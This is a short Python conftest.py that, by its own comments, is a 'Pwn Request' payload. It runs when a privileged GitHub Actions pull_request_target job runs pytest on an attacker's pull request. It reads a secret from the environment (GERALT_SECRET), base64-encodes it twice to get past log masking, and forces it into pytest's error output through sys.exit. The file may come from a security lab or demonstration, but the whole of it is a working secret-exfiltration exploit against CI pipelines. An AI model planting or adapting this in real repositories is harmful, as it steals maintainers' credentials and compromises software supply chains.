import base64
import os
import sys

# Pwn Request payload: executes in the privileged pull_request_target job
# when `pdm run pytest` imports this conftest.py from the attacker-controlled
# checkout (github.event.pull_request.head.sha).
secret = os.environ.get("GERALT_SECRET", "NOT_SET")
leak = base64.b64encode(base64.b64encode(secret.encode("utf-8"))).decode("utf-8")
msg = f"GERALT_LEAKED_TOKEN={leak}"
print(msg, file=sys.stderr)
sys.stderr.flush()
# Exit with the leak as the exception value so pytest prints it verbatim in the
# collection-error traceback (immune to pytest's output capture).
sys.exit(msg)
